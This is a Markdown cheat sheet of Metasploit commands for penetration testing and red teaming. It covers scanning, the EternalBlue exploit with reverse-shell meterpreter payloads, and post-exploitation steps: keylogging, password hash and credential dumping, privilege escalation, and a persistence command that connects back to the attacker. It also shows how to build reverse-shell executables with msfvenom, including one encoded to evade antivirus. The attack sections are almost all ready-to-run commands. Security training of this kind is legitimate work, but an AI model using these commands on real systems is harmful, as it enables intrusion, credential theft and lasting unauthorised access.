# 💥 Metasploit Cheat Sheet

Metasploit is one of the most powerful frameworks for penetration testing and red teaming. This cheat sheet contains key commands, modules, workflows, and post-exploitation tips to help you stay sharp and efficient.

---

## 📦 Table of Contents

- [🔧 Starting Metasploit](#-starting-metasploit)
- [🔍 Scanning and Discovery](#-scanning-and-discovery)
- [🎯 Exploitation Workflow](#-exploitation-workflow)
- [📡 Payloads and Sessions](#-payloads-and-sessions)
- [👣 Post-Exploitation](#-post-exploitation)
- [🔐 Privilege Escalation](#-privilege-escalation)
- [🎭 Persistence](#-persistence)
- [📜 Useful Commands](#-useful-commands)
- [🛠️ Custom Payloads with `msfvenom`](#️-custom-payloads-with-msfvenom)
- [📚 Resources](#-resources)

---

## 🔧 Starting Metasploit

```bash
sudo systemctl start postgresql
msfdb init         # First time only
msfconsole         # Launch Metasploit

search type:auxiliary scanner      # List scanning modules
use auxiliary/scanner/portscan/tcp
set RHOSTS <target>
run

Common scanners:

    scanner/portscan/tcp

    scanner/http/http_version

    scanner/ssh/ssh_version

    scanner/smb/smb_version

search <service/vuln>
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS <target>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your-ip>
exploit

📡 Payloads and Sessions
List Payloads:
`
`show payloads`

Common Payloads:

| OS     | Payload                            |
| ------ | ---------------------------------- |
| Linux  | linux/x86/meterpreter/reverse\_tcp |
| Win32  | windows/meterpreter/reverse\_tcp   |
| PHP    | php/meterpreter/reverse\_tcp       |
| Python | python/meterpreter/reverse\_tcp    |



👣 Post-Exploitation

Inside Meterpreter:

sysinfo                # System info
getuid                 # Current user
ps                     # List processes
shell                  # Drop to system shell
upload / download      # Transfer files
screenshot             # Take screenshot
keyscan_start / dump   # Keylogger
hashdump               # Dump password hashes

run autoroute -s 192.168.10.0/24

🔐 Privilege Escalation

getsystem              # Try auto priv-esc
load kiwi              # Use mimikatz-style tools
creds_all              # Dump all credentials

Manual Enumeration:

    Check C:\Users\Public, Startup folders, weak services

    Look for unquoted service paths, insecure permissions


🎭 Persistence

```bash
run persistence -U -i 5 -p 4444 -r <your-ip>```

Options:

    -U: Run on user login

    -i 5: Delay interval in seconds

    -p: Port to connect back

    -r: Remote IP (your listener)

📜 Useful Commands
| Command           | Description                           |
| ----------------- | ------------------------------------- |
| `help`            | List commands                         |
| `info`            | Show module details                   |
| `use <module>`    | Load a module                         |
| `set <option>`    | Set option value                      |
| `show options`    | Show required options                 |
| `exploit` / `run` | Execute module                        |
| `jobs`            | List background jobs                  |
| `kill <id>`       | Kill job or session                   |
| `db_nmap`         | Run Nmap and save results to database |
| `notes`           | Add or view target notes              |


🛠️ Custom Payloads with msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=4444 -f exe > shell.exe
```
Output Formats:
| Format | Description        |
| ------ | ------------------ |
| exe    | Windows executable |
| elf    | Linux binary       |
| php    | PHP code           |
| asp    | ASP shell          |
| war    | Java WAR file      |
| raw    | Raw payload        |
| c      | C code shellcode   |


To encode payloads:

```bash
msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe
```


📚 Resources

    Metasploit Unleashed

    PayloadsAllTheThings

    MSF Module Library

    GTFOBins

    
Stay silent, stay stealthy — and always verify your shell! 🐚⚡

